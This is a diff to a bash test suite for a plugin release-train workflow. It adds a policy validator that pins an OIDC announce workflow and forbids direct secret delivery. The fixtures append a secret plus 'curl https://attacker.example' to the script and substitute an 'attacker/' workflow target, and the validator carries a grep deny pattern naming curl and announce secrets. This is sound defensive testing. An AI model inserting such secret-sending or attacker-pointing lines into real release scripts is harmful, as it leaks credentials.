@@ -5,9 +5,74 @@ ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 TMP="$(mktemp -d)"
 trap 'rm -rf "$TMP"' EXIT
 
+HARDENED_SHA='08f7d22f3a5b59b1658ab2e96a20d0d3c352869c'
+RETIRED_SHA='c981b872ebf650805200ad72c8b7142232f8b3f6'
+ANNOUNCE_WORKFLOW='StartupBros-com/hov-marketplace/.github/workflows/hov-tool-drop-announce.yml'
+HARDENED_USES="$ANNOUNCE_WORKFLOW@$HARDENED_SHA"
+ANNOUNCE_IF="github.event.release.draft == false && github.event.release.prerelease == false && needs.promote.result == 'success'"
+
 pass() { printf 'ok - %s\n' "$1"; }
 fail() { printf 'not ok - %s\n' "$1" >&2; exit 1; }
 assert_eq() { [[ "$1" == "$2" ]] || fail "$3: expected $2, got $1"; pass "$3"; }
+
+validate_release_policy() {
+  local workflow="$1" script="$2" json
+  if grep -Eq 'TOOL_RELEASE_ANNOUNCE_(SECRET|URL)|ANNOUNCE_(SECRET|URL)|x-tool-release-announce-secret|/api/internal/ops/tool-releases|(^|[[:space:]])curl([[:space:]]|$)' "$workflow" "$script"; then
+    printf 'direct Tool Drop delivery surface is forbidden\n' >&2
+    return 1
+  fi
+  if ! json="$(yq -o=json '.' "$workflow" 2>/dev/null)"; then
+    printf 'release workflow must parse as YAML\n' >&2
+    return 1
+  fi
+  jq -e '.on.release.types == ["published", "edited"]' <<<"$json" >/dev/null || {
+    printf 'release events must be exactly published and edited\n' >&2
+    return 1
+  }
+  jq -e '.permissions == {"contents": "read"}' <<<"$json" >/dev/null || {
+    printf 'workflow permissions must be exactly contents read\n' >&2
+    return 1
+  }
+  jq -e --arg key '${{ secrets.HOV_MARKETPLACE_DEPLOY_KEY }}' \
+    'any(.jobs.promote.steps[]?; .with."ssh-key" == $key)' <<<"$json" >/dev/null || {
+    printf 'promotion must retain the marketplace deploy key\n' >&2
+    return 1
+  }
+  jq -e --arg uses "$HARDENED_USES" '.jobs.announce.uses == $uses' <<<"$json" >/dev/null || {
+    printf 'announce job must use the hardened immutable workflow\n' >&2
+    return 1
+  }
+  jq -e '.jobs.announce.needs == "promote"' <<<"$json" >/dev/null || {
+    printf 'announce job must depend on promotion\n' >&2
+    return 1
+  }
+  jq -e --arg condition "$ANNOUNCE_IF" '.jobs.announce.if == $condition' <<<"$json" >/dev/null || {
+    printf 'announce job must retain the stable release gate\n' >&2
+    return 1
+  }
+  jq -e '.jobs.announce.permissions == {"contents": "read", "id-token": "write"}' <<<"$json" >/dev/null || {
+    printf 'announce permissions must be exactly contents read and id-token write\n' >&2
+    return 1
+  }
+  jq -e '(.jobs.announce | keys | sort) == ["if", "name", "needs", "permissions", "uses"]' <<<"$json" >/dev/null || {
+    printf 'announce job may not add inputs, secrets, or unrelated behavior\n' >&2
+    return 1
+  }
+}
+
+assert_policy_failure() {
+  local label="$1" diagnostic="$2" workflow="$3" script="$4" output status
+  if output="$(validate_release_policy "$workflow" "$script" 2>&1)"; then
+    status=0
+  else
+    status=$?
+  fi
+  if [[ "$status" -eq 1 && "$output" == *"$diagnostic"* ]]; then
+    pass "$label"
+  else
+    fail "$label: expected exit 1 with [$diagnostic], got exit $status and [$output]"
+  fi
+}
 
 mkdir -p "$TMP/bin" "$TMP/source/.claude-plugin"
 printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$*" >> "$CURL_LOG"\n' > "$TMP/bin/curl"
@@ -60,34 +125,33 @@ GIT_WRAPPER
 chmod +x "$TMP/bin/git"
 export REAL_GIT RACE_MARKER="$TMP/race-marker" RACE_ON_FIRST_PUSH=1
 export PATH="$TMP/bin:$PATH" CURL_LOG="$TMP/curl.log"
+: > "$CURL_LOG"
 common=(
   EVENT_ACTION=published REPOSITORY=token-eater RELEASE_ID=101 RELEASE_TAG=v0.1.1
-  RELEASE_NAME='Token Eater 0.1.1' RELEASE_URL='https://github.com/StartupBros-com/token-eater/releases/tag/v0.1.1'
   RELEASE_PRERELEASE=false RELEASE_DRAFT=false LATEST_STABLE_ID=101 SOURCE_ROOT="$TMP/source"
-  SOURCE_SHA="$SOURCE_SHA" MARKETPLACE_DIR="$TMP/marketplace" ANNOUNCE_URL=https://example.test/tool-releases
-  ANNOUNCE_SECRET=test-secret
+  SOURCE_SHA="$SOURCE_SHA" MARKETPLACE_DIR="$TMP/marketplace"
 )
 env "${common[@]}" "$ROOT/scripts/release-train.sh" >/dev/null
 fresh="$TMP/fresh"
 git clone -q "$TMP/marketplace.git" "$fresh"
 assert_eq "$(jq -r '.plugins[] | select(.name=="token-eater") | .metadata.releaseId' "$fresh/.claude-plugin/marketplace.json")" 101 'stable latest release promotes'
 assert_eq "$(jq -r '.plugins[] | select(.name=="pro-gate") | .metadata.releaseId' "$fresh/.claude-plugin/marketplace.json")" 301 'push-race retry preserves competing promotion'
-assert_eq "$(wc -l < "$TMP/curl.log")" 1 'promotion announces once'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'promotion never calls a direct announcement endpoint'
 
 env "${common[@]}" "$ROOT/scripts/release-train.sh" >/dev/null
-assert_eq "$(wc -l < "$TMP/curl.log")" 2 'rerun calls idempotent announce operation'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'rerun remains promotion-only'
 
 env "${common[@]}" RELEASE_ID=100 LATEST_STABLE_ID=100 "$ROOT/scripts/release-train.sh" >/dev/null
-assert_eq "$(wc -l < "$TMP/curl.log")" 2 'older release no-op does not announce'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'older release no-op never delivers directly'
 
 env "${common[@]}" RELEASE_ID=102 LATEST_STABLE_ID=102 RELEASE_PRERELEASE=true "$ROOT/scripts/release-train.sh" >/dev/null
-assert_eq "$(wc -l < "$TMP/curl.log")" 2 'prerelease is ignored'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'prerelease remains promotion and delivery no-op'
 
 assert_eq "$(git -C "$TMP/marketplace" config user.name)" hov-release-bot 'promotion configures repo-local bot name'
 assert_eq "$(git -C "$TMP/marketplace" config user.email)" hov-release-bot@users.noreply.github.com 'promotion configures repo-local bot email'
 
 env "${common[@]}" EVENT_ACTION=edited "$ROOT/scripts/release-train.sh" >/dev/null
-assert_eq "$(wc -l < "$TMP/curl.log")" 3 'edited release announces when marketplace exactly matches'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'edited matching release remains promotion-only'
 
 corrupt="$TMP/corrupt"
 git clone -q "$TMP/marketplace.git" "$corrupt"
@@ -102,42 +166,68 @@ git -C "$corrupt" push -q origin HEAD:main
 if env "${common[@]}" EVENT_ACTION=edited "$ROOT/scripts/release-train.sh" >/dev/null 2>&1; then
   fail 'edited release repairs immutable drift under the same release ID'
 fi
-assert_eq "$(wc -l < "$TMP/curl.log")" 3 'same-ID drift fails closed without announcement'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'same-ID drift fails closed without direct delivery'
 
 RACE_ON_FIRST_PUSH=0
 env "${common[@]}" EVENT_ACTION=edited RELEASE_ID=102 LATEST_STABLE_ID=102 "$ROOT/scripts/release-train.sh" >/dev/null
-assert_eq "$(wc -l < "$TMP/curl.log")" 4 'newly stable edited release promotes and announces once'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'newly stable edited release promotes without direct delivery'
 assert_eq "$(jq -r '.plugins[] | select(.name=="token-eater") | .metadata.releaseId' "$TMP/marketplace/.claude-plugin/marketplace.json")" 102 'newly stable edited release advances marketplace'
 
 env "${common[@]}" EVENT_ACTION=edited RELEASE_PRERELEASE=true "$ROOT/scripts/release-train.sh" >/dev/null
-assert_eq "$(wc -l < "$TMP/curl.log")" 4 'edited prerelease remains production no-op'
-
-# --- notes_summary: card-ready bullets for the What's-new announcement section ---
-ns() { RELEASE_NOTES="$1" bash -c "source <(sed -n '/^notes_summary()/,/^}/p' '$ROOT/scripts/release-train.sh'); notes_summary"; }
-AUTO="$(printf '%s\n' "## Whats Changed" "* feat(token-eater): safer cleanup passes (v0.5.0) by @u in https://x/pull/1" "* fix(token-eater): draft PR guard by @u in https://x/pull/2" "" "**Full Changelog**: https://x/compare/a...b")"
-assert_eq "$(ns "$AUTO")" "$(printf 'safer cleanup passes\ndraft PR guard')" 'auto-notes bullets are cleaned'
-HL="$(printf '%s\n' "## Highlights" "* Hand-picked one" "" "## Whats Changed" "* feat: noise by @u in https://x")"
-assert_eq "$(ns "$HL")" 'Hand-picked one' 'Highlights section wins'
-assert_eq "$(ns 'Prose only body.')" 'Prose only body. ' 'prose falls back to first paragraph (legacy trailing space; endpoint trims)'
-CONTRIB="$(printf '%s\n' "## Whats Changed" '* feat: real change by @u in https://x/pull/1' '' '## New Contributors' '* @newbie made their first contribution in https://x/pull/1')"
-assert_eq "$(ns "$CONTRIB")" 'real change' 'contributor-section bullets never become highlights'
-CJK_OUT="$(ns "$(printf '* %s' "$(python3 -c "print('测' * 200)")")")"
-assert_eq "$(printf '%s' "$CJK_OUT" | python3 -c 'import sys; print(len(sys.stdin.read()))')" '180' 'multibyte bullets slice at 180 characters'
-
-
-
-# The legacy script still owns marketplace promotion, but production runs set
-# PROMOTE_ONLY so the dependent OIDC reusable workflow is the ONE announcer.
-before_promote_only="$(wc -l < "$TMP/curl.log")"
-promote_only_out="$(PROMOTE_ONLY=true bash -c "source <(sed -n '/^announce()/,/^}/p' '$ROOT/scripts/release-train.sh'); announce")"
-assert_eq "$promote_only_out" 'announcement delegated to the canonical OIDC job' 'promotion-only mode delegates announcement'
-assert_eq "$(wc -l < "$TMP/curl.log")" "$before_promote_only" 'promotion-only mode never calls the secret-authenticated endpoint'
+assert_eq "$(wc -l < "$CURL_LOG")" 0 'edited prerelease remains production no-op'
 
 WF="$ROOT/.github/workflows/release-train.yml"
-grep -q 'PROMOTE_ONLY: true' "$WF" || fail 'release workflow does not suppress the legacy announcer'; pass 'release workflow suppresses legacy announcer'
-grep -q 'Announce via canonical OIDC train' "$WF" || fail 'canonical OIDC announce job missing'; pass 'canonical OIDC announce job present'
-grep -q 'id-token: write' "$WF" || fail 'OIDC announce job lacks id-token permission'; pass 'OIDC permission present'
-grep -q 'hov-tool-drop-announce.yml@c981b872ebf650805200ad72c8b7142232f8b3f6' "$WF" || fail 'canonical announce workflow is not SHA-pinned'; pass 'canonical announce workflow SHA-pinned'
-! grep -q 'TOOL_RELEASE_ANNOUNCE_SECRET' "$WF" || fail 'static announce secret remains in the production workflow'; pass 'static announce secret removed from production workflow'
+SCRIPT="$ROOT/scripts/release-train.sh"
+validate_release_policy "$WF" "$SCRIPT"
+pass 'checked-in release train uses the hardened OIDC policy'
+
+mkdir -p "$TMP/policy"
+if ! python3 - "$WF" "$SCRIPT" "$TMP/policy" "$HARDENED_USES" "$RETIRED_SHA" <<'PY'
+import sys
+from pathlib import Path
+
+workflow_path, script_path, output_dir, hardened_uses, retired_sha = sys.argv[1:]
+workflow = Path(workflow_path).read_text()
+script = Path(script_path).read_text()
+out = Path(output_dir)
+uses_line = f"    uses: {hardened_uses}"
+assert workflow.count(uses_line) == 1
+
+retired = workflow.replace(uses_line, uses_line.replace(hardened_uses.rsplit("@", 1)[1], retired_sha), 1)
+assert retired != workflow and retired_sha in retired
+(out / "retired.yml").write_text(retired)
+
+decoy = workflow.replace(
+    uses_line,
+    f"    uses: attacker/hov-marketplace/.github/workflows/hov-tool-drop-announce.yml@{hardened_uses.rsplit('@', 1)[1]}\n"
+    f"\n  decoy:\n    uses: {hardened_uses}",
+    1,
+)
+assert decoy != workflow and decoy.count(hardened_uses) == 1 and "\n  decoy:\n" in decoy
+(out / "decoy.yml").write_text(decoy)
+
+shadowed = workflow.replace("      id-token: write", "      id-token: read", 1)
+assert shadowed != workflow
+(out / "shadowed.yml").write_text(shadowed)
+
+secret_script = script + "\nANNOUNCE_SECRET=forbidden-test-fixture\ncurl https://attacker.example\n"
+assert secret_script != script and "ANNOUNCE_SECRET" in secret_script and "curl https://" in secret_script
+(out / "secret-script.sh").write_text(secret_script)
+PY
+then
+  fail 'policy fixture generation failed'
+fi
+for fixture in retired.yml decoy.yml shadowed.yml secret-script.sh; do
+  [[ -s "$TMP/policy/$fixture" ]] || fail "missing generated fixture: $fixture"
+done
+
+assert_policy_failure 'retired workflow pin is rejected' \
+  'announce job must use the hardened immutable workflow' "$TMP/policy/retired.yml" "$SCRIPT"
+assert_policy_failure 'blessed-SHA decoy cannot hide an attacker announce target' \
+  'announce job must use the hardened immutable workflow' "$TMP/policy/decoy.yml" "$SCRIPT"
+assert_policy_failure 'job-level permission shadowing is rejected' \
+  'announce permissions must be exactly contents read and id-token write' "$TMP/policy/shadowed.yml" "$SCRIPT"
+assert_policy_failure 'direct secret delivery cannot return in the release script' \
+  'direct Tool Drop delivery surface is forbidden' "$WF" "$TMP/policy/secret-script.sh"
 
 echo 'ALL PASS'
